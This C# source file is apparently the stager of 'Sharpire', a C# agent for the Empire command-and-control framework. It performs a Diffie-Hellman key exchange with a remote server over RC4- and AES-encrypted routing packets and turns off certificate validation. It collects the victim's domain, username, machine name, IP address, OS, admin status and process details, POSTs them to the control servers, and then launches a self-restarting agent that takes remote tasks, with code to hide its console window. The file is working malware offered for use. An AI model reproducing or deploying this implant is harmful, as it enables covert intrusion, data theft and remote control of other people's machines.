using System;
using System.Linq;
using System.Management;
using System.Management.Automation.Runspaces;
using System.Net;
using System.Diagnostics;
using System.Security.Cryptography;
using System.Security.Principal;
using System.Text;
using System.Numerics;


namespace Sharpire
{
    public class DiffieHellman
    {
        private BigInteger privateKey;
        public BigInteger publicKey { get; private set; }
        private BigInteger prime;
        private BigInteger generator;

        public byte[] PublicKeyBytes { get; private set; }
        public byte[] PrivateKeyBytes { get; private set; }
        
        public byte[] AesKey { get; private set; }

        public DiffieHellman()
        {
            generator = new BigInteger(2);
            prime = BigInteger.Parse(
                "00"+"FFFFFFFFFFFFFFFFC90FDAA22168C234C4C6628B80DC1CD129024E088A67CC74020BBEA63B139B22514A08798E3404DDEF9519B3CD3A431B302B0A6DF25F14374FE1356D6D51C245E485B576625E7EC6F44C42E9A637ED6B0BFF5CB6F406B7EDEE386BFB5A899FA5AE9F24117C4B1FE649286651ECE45B3DC2007CB8A163BF0598DA48361C55D39A69163FA8FD24CF5F83655D23DCA3AD961C62F356208552BB9ED529077096966D670C354E4ABC9804F1746C08CA18217C32905E462E36CE3BE39E772C180E86039B2783A2EC07A28FB5C55DF06F4C52C9DE2BCBF6955817183995497CEA956AE515D2261898FA051015728E5A8AAAC42DAD33170D04507A33A85521ABDF1CBA64ECFB850458DBEF0A8AEA71575D060C7DB3970F85A6E1E4C7ABF5AE8CDB0933D71E8C94E04A25619DCEE3D2261AD2EE6BF12FFA06D98A0864D87602733EC86A64521F2B18177B200CBBE117577A615D6C770988C0BAD946E208E24FA074E5AB3143DB5BFCE0FD108E4B82D120A92108011A723C12A787E6D788719A10BDBA5B2699C327186AF4E23C1A946834B6150BDA2583E9CA2AD44CE8DBBBC2DB04DE8EF92E8EFC141FBECAA6287C59474E6BC05D99B2964FA090C3A2233BA186515BE7ED1F612970CEE2D7AFB81BDD762170481CD0069127D5B05AA993B4EA988D8FDDC186FFB7DC90A6C08F4DF435C93402849236C3FAB4D27C7026C1D4DCB2602646DEC9751E763DBA37BDF8FF9406AD9E530EE5DB382F413001AEB06A53ED9027D831179727B0865A8918DA3EDBEBCF9B14ED44CE6CBACED4BB1BDB7F1447E6CC254B332051512BD7AF426FB8F401378CD2BF5983CA01C64B92ECF032EA15D1721D03F482D7CE6E74FEF6D55E702F46980C82B5A84031900B1C9E59E7C97FBEC7E8F323A97A7E36CC88BE0F1D45B7FF585AC54BD407B22B4154AACC8F6D7EBF48E1D814CC5ED20F8037E0A79715EEF29BE32806A1D58BB7C5DA76F550AA3D8A1FBFF0EB19CCB1A313D55CDA56C9EC2EF29632387FE8D76E3C0468043E8F663F4860EE12BF2D5B0B7474D6E694F91E6DCC4024FFFFFFFFFFFFFFFF",
                System.Globalization.NumberStyles.HexNumber
            );

            privateKey = GenerateRandomBigInteger();
            PrivateKeyBytes = privateKey.ToByteArray();
            publicKey = BigInteger.ModPow(generator, privateKey, prime);
            PublicKeyBytes = publicKey.ToByteArray();
        }
        
        public BigInteger BigIntegerFromHexBytes(byte[] bytes)
        {
            string hexString = BitConverter.ToString(bytes).Replace("-", "");
            return BigInteger.Parse(hexString, System.Globalization.NumberStyles.HexNumber);
        }
        
        public void GenerateSharedSecret(byte[] serverPubKey)
        {
            
            BigInteger bigIntValue = BigIntegerFromHexBytes(serverPubKey);
            BigInteger sharedSecret = BigInteger.ModPow(bigIntValue, privateKey, prime);

            byte[] rawSharedSecretBytes = sharedSecret.ToByteArray();
            Array.Reverse(rawSharedSecretBytes);
            
            BigInteger absSharedSecret = BigInteger.Abs(sharedSecret);

            string binaryString = string.Join("", absSharedSecret
                .ToByteArray()
                .Reverse()
                .Select(b => Convert.ToString(b, 2).PadLeft(8, '0'))); // Convert each byte to binary

            binaryString = binaryString.TrimStart('0');
            int bitLength = binaryString.Length + 2;
            int expectedLength = (bitLength + 1); 
            
            if (rawSharedSecretBytes.Length > expectedLength)
            {
                rawSharedSecretBytes = rawSharedSecretBytes.Skip(rawSharedSecretBytes.Length - expectedLength).ToArray();
            }

            byte[] sharedSecretBytes = new byte[expectedLength];
            Array.Copy(rawSharedSecretBytes, 0, sharedSecretBytes, expectedLength - rawSharedSecretBytes.Length, rawSharedSecretBytes.Length);

            using (SHA256 sha256 = SHA256.Create())
            {
                AesKey = sha256.ComputeHash(sharedSecretBytes);
            }
        }
        
        private static BigInteger GenerateRandomBigInteger()
        {
            byte[] bytes = new byte[540];

            using (RandomNumberGenerator rng = RandomNumberGenerator.Create())
            {
                rng.GetBytes(bytes);
            }

            bytes[bytes.Length - 1] &= 0x7F;
            BigInteger randomInt = new BigInteger(bytes);

            if (randomInt == 0)
            {
                return GenerateRandomBigInteger();
            }

            return randomInt;
        }
    }
    
    class EmpireStager
    {
        private SessionInfo sessionInfo;

        private byte[] stagingKeyBytes;

        public class RoutingPacket
        {
            public byte[] InitializationVector { get; set; }
            public byte[] EncryptedData { get; set; }
            public byte[] DecryptedData { get; set; }
            public string SessionId { get; set; }
            public byte Language { get; set; }
            public byte MetaData { get; set; }
            public byte[] Extra { get; set; }
            public uint PacketLength { get; set; }
        }
        
        public EmpireStager(SessionInfo sessionInfo1)
        {
            sessionInfo = sessionInfo1;
            stagingKeyBytes = Encoding.ASCII.GetBytes(sessionInfo.GetStagingKey());

            Random random = new Random();
            string characters = "ABCDEFGHKLMNPRSTUVWXYZ123456789";
            char[] charactersArray = characters.ToCharArray();
            StringBuilder sb = new StringBuilder(8);
            for (int i = 0; i < 8; i++)
            {
                int j = random.Next(charactersArray.Length);
                sb.Append(charactersArray[j]);
            }

            sessionInfo.SetAgentID("00000000");
        }

        internal static byte[] NewInitializationVector(int length)
        {
            Random random = new Random();
            byte[] initializationVector = new byte[length];
            for (int i = 0; i < initializationVector.Length; i++)
            {
                initializationVector[i] = Convert.ToByte(random.Next(0, 255));
            }

            return initializationVector;
        }

        ////////////////////////////////////////////////////////////////////////////////
        public void Execute()
        {
            byte[] stage1response;
            byte[] stage2response;
            ServicePointManager.ServerCertificateValidationCallback = delegate { return true; };

            try
            {
                stage1response = Stage1();
                Stage2(stage1response);
                try
                {
#if (PRINT)
                    Console.WriteLine("Launching Empire");
                    IntPtr handle = Misc.GetConsoleWindow();
                    Misc.ShowWindow(handle, Misc.SW_HIDE);
#endif

                    DotNetEmpire();
                }
                catch
                {
                    GC.Collect();
                    Execute();
                }
            }
            catch (WebException webError)
            {
                if ((int)((HttpWebResponse)webError.Response).StatusCode == 500)
                {
                    GC.Collect();
                    Execute();
                }
                else
                {
                    throw;
                }
            }
            catch (Exception error)
            {
                Console.WriteLine(error.ToString());
            }
            finally
            {
                sessionInfo = null;
                stagingKeyBytes = null;
            }
        }

        public static byte[] BuildRoutingPacket(byte[] key, string sessionId, int meta, byte[] encryptedBytes)
        {
            int encryptedBytesLength = (encryptedBytes != null) ? encryptedBytes.Length : 0;

            byte[] data = Encoding.ASCII.GetBytes(sessionId);
            byte lang = 0x03;
            data = Misc.combine(data, new byte[4] { lang, Convert.ToByte(meta), 0x00, 0x00 });
            data = Misc.combine(data, BitConverter.GetBytes(encryptedBytesLength));

            byte[] initializationVector = NewInitializationVector(4);
            byte[] rc4Key = Misc.combine(initializationVector, key);
            byte[] routingPacketData = rc4Encrypt(rc4Key, data);

            routingPacketData = Misc.combine(initializationVector, routingPacketData);
            if (encryptedBytes != null)
            {
                routingPacketData = Misc.combine(routingPacketData, encryptedBytes);
            }

            return routingPacketData;
        }
        
        public static string Utf8StringToHex(string utf8Str)
        {
            BigInteger intValue = BigInteger.Parse(utf8Str);
            string hexString = intValue.ToString("X"); // Uppercase Hex

            return hexString;
        }

        public static byte[] HexStringToByteArray(string hexString)
        {
            if (hexString.Length % 2 != 0)
                hexString = "0" + hexString;

            int byteCount = hexString.Length / 2;
            byte[] bytes = new byte[byteCount];

            for (int i = 0; i < byteCount; i++)
            {
                bytes[i] = Convert.ToByte(hexString.Substring(i * 2, 2), 16);
            }

            return bytes;
        }
        
        private byte[] Stage1()
        {
            DiffieHellman dh = new DiffieHellman(); // Step 1: Create DH key pair
            byte[] publicKeyBytes = dh.PublicKeyBytes;
            
            byte[] hmacData = AesEncryptThenHmac(stagingKeyBytes, publicKeyBytes);

            byte[] routingPacket = BuildRoutingPacket(stagingKeyBytes, "00000000", 2, hmacData);

            Random random = new Random();
            byte[] response = SendData(sessionInfo.GetTaskURIs()[random.Next(0, sessionInfo.GetTaskURIs().Length)], routingPacket);

            RoutingPacket packet = DecodeRoutingPacket(response);
            sessionInfo.SetAgentID(packet.SessionId);

            byte[] decryptedData = AesDecryptAndVerify(stagingKeyBytes, packet.EncryptedData);
            byte[] nonce = decryptedData.Take(16).ToArray();
            byte[] serverPubKey = decryptedData.Skip(16).ToArray();
            
            string serverPubKeyAscii = Utf8StringToHex(Encoding.UTF8.GetString(serverPubKey));
            
            dh.GenerateSharedSecret(HexStringToByteArray(serverPubKeyAscii));
            sessionInfo.SetSessionKeyBytes(dh.AesKey);

            return nonce;
        }

        private RoutingPacket DecodeRoutingPacket(byte[] packetData)
        {
            if (packetData.Length < 20)
            {
                return null;
            }

            int offset = 0;

            while (offset < packetData.Length)
            {
                byte[] routingPacket = packetData.Skip(offset).Take(20).ToArray();
                byte[] routingInitializationVector = routingPacket.Take(4).ToArray();
                byte[] routingEncryptedData = routingPacket.Skip(4).Take(16).ToArray();
                offset += 20;

                byte[] stagingKey = sessionInfo.GetStagingKeyBytes();
                byte[] rc4Key = Misc.combine(routingInitializationVector, stagingKey);
                
                byte[] routingData = rc4Encrypt(rc4Key, routingEncryptedData);

                if (routingData.Length < 16)
                {
                    return null;
                }

                string packetSessionId = Encoding.UTF8.GetString(routingData.Take(8).ToArray());

                byte language = routingData[8];
                byte metaData = routingData[9];
                byte[] extra = routingData.Skip(10).Take(2).ToArray();
                uint packetLength = BitConverter.ToUInt32(routingData, 12);

                if (packetLength == 0 || packetLength > packetData.Length - offset)
                {
                    return null;
                }

                byte[] encryptedData = packetData.Skip(offset).Take((int)packetLength).ToArray();

                return new RoutingPacket
                {
                    InitializationVector = routingInitializationVector,
                    EncryptedData = encryptedData,
                    DecryptedData = null,
                    SessionId = packetSessionId,
                    Language = language,
                    MetaData = metaData,
                    Extra = extra,
                    PacketLength = packetLength
                };
            }

            return null;
        }
        
        private void Stage2(byte[] nonce)
        {
            byte[] keyBytes = sessionInfo.GetSessionKeyBytes();
            
            long increment = Convert.ToInt64(Encoding.ASCII.GetString(nonce)) + 1;
            string newNonce = increment.ToString();

            byte[] systemInfoBytes =
                GetSystemInformation(newNonce + "|", string.Join(",", sessionInfo.GetControlServers()));

            byte[] encryptedData = AesEncryptThenHmac(keyBytes, systemInfoBytes);

            byte[] routingPacket = BuildRoutingPacket(stagingKeyBytes, sessionInfo.GetAgentID(), 3, encryptedData);

            Random random = new Random();
            SendData(sessionInfo.GetTaskURIs()[random.Next(0, sessionInfo.GetTaskURIs().Length)], routingPacket);
        }
        
        private void DotNetEmpire()
        {
            Agent agent = new Agent(sessionInfo);
            agent.GetComs();
            try
            {
                agent.Execute();
            }
            catch (Exception)
            {
                GC.Collect();
                DotNetEmpire();
            }
        }
        
        public byte[] SendData(string uri, byte[] data)
        {
            byte[] response = new byte[0];
            using (WebClient webClient = new WebClient())
            {
                webClient.Headers.Add("User-Agent", sessionInfo.GetStagerUserAgent());
                webClient.Proxy = WebRequest.GetSystemWebProxy();
                webClient.Proxy.Credentials = CredentialCache.DefaultCredentials;
                response = webClient.UploadData(sessionInfo.GetControlServers().First() + uri, "POST", data);
            }

            return response;
        }

        public static byte[] GetSystemInformation(string information, string server)
        {
            information += server + "|";
            information += Environment.UserDomainName + "|";
            information += Environment.UserName + "|";
            information += Environment.MachineName + "|";

            ManagementScope scope = new ManagementScope("\\\\.\\root\\cimv2");
            scope.Connect();
            ObjectQuery query = new ObjectQuery("SELECT * FROM Win32_NetworkAdapterConfiguration");
            ManagementObjectSearcher objectSearcher = new ManagementObjectSearcher(scope, query);
            ManagementObjectCollection objectCollection = objectSearcher.Get();
            string ipAddress = "";
            foreach (ManagementObject managementObject in objectCollection)
            {
                string[] addresses = (string[])managementObject["IPAddress"];
                if (null != addresses)
                {
                    foreach (string address in addresses)
                    {
                        if (address.Contains("."))
                        {
                            ipAddress = address;
                        }
                    }
                }
            }

            if (0 < ipAddress.Length)
            {
                information += ipAddress + "|";
            }
            else
            {
                information += "0.0.0.0|";
            }

            query = new ObjectQuery("SELECT * FROM Win32_OperatingSystem");
            objectSearcher = new ManagementObjectSearcher(scope, query);
            objectCollection = objectSearcher.Get();
            string operatingSystem = "";
            foreach (ManagementObject managementObject in objectCollection)
            {
                operatingSystem = (string)managementObject["Name"];
                operatingSystem = operatingSystem.Split('|')[0];
            }

            information += operatingSystem + "|";

            bool elevated =
                new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator);
            if ("SYSTEM" == Environment.UserName.ToUpper())
            {
                information += "True|";
            }
            else
            {
                information += elevated + "|";
            }

            Process process = Process.GetCurrentProcess();
            information += process.ProcessName + "|";
            information += process.Id + "|";
            //TODO fix this from being hard coded  
            information += "csharp|5";
            information += "|" + Environment.GetEnvironmentVariable("PROCESSOR_ARCHITECTURE");

            return Encoding.ASCII.GetBytes(information);
        }
        
        public static byte[] rc4Encrypt(byte[] RC4Key, byte[] data)
        {
            byte[] output = new byte[data.Length];
            byte[] s = new byte[256];
            for (int x = 0; x < 256; x++)
            {
                s[x] = Convert.ToByte(x);
            }

            int j = 0;
            for (int x = 0; x < 256; x++)
            {
                j = (j + s[x] + RC4Key[x % RC4Key.Length]) % 256;

                byte hold = s[x];
                s[x] = s[j];
                s[j] = hold;
            }

            int i = j = 0;

            int k = 0;
            foreach (byte entry in data)
            {
                i = (i + 1) % 256;
                j = (j + s[i]) % 256;

                byte hold = s[i];
                s[i] = s[j];
                s[j] = hold;

                output[k++] = Convert.ToByte(entry ^ s[(s[i] + s[j]) % 256]);
            }

            return output;
        }

        public static byte[] AesEncryptThenHmac(byte[] key, byte[] data)
        {
            byte[] iv = new byte[16];
            new Random().NextBytes(iv);
            byte[] encrypted = aesEncrypt(key, iv, data);
            encrypted = Misc.combine(iv, encrypted);

            using (HMACSHA256 hmac = new HMACSHA256(key))
            {
                byte[] hmacHash = hmac.ComputeHash(encrypted).Take(10).ToArray();
                return Misc.combine(encrypted, hmacHash);
            }
        }
        
        public static byte[] aesEncrypt(byte[] keyBytes, byte[] ivBytes, byte[] dataBytes)
        {
            byte[] encryptedBytes = new byte[0];
            using (AesCryptoServiceProvider aesCrypto = new AesCryptoServiceProvider())
            {
                aesCrypto.Mode = CipherMode.CBC;
                aesCrypto.Key = keyBytes;
                aesCrypto.IV = ivBytes;
                ICryptoTransform encryptor = aesCrypto.CreateEncryptor();
                encryptedBytes = encryptor.TransformFinalBlock(dataBytes, 0, dataBytes.Length);
            }

            return encryptedBytes;
        }

        public static byte[] AesDecryptAndVerify(byte[] key, byte[] data)
        {
            byte[] hmacReceived = data.Skip(data.Length - 10).Take(10).ToArray();
            byte[] encrypted = data.Take(data.Length - 10).ToArray();

            using (HMACSHA256 hmac = new HMACSHA256(key))
            {
                byte[] hmacComputed = hmac.ComputeHash(encrypted).Take(10).ToArray();
                if (!hmacComputed.SequenceEqual(hmacReceived))
                {
                    throw new CryptographicException("HMAC verification failed.");
                }
            }
            return aesDecrypt(key, encrypted);
        }

        ////////////////////////////////////////////////////////////////////////////////
        public static byte[] aesDecrypt(byte[] key, byte[] data)
        {
            byte[] iv = data.Take(16).ToArray();
            byte[] cipherText = data.Skip(16).ToArray();

            using (AesCryptoServiceProvider aesCrypto = new AesCryptoServiceProvider())
            {
                aesCrypto.Mode = CipherMode.CBC;
                aesCrypto.Padding = PaddingMode.PKCS7;
                aesCrypto.Key = key;
                aesCrypto.IV = iv;
                return aesCrypto.CreateDecryptor().TransformFinalBlock(cipherText, 0, cipherText.Length);
            }
        }
    }
}
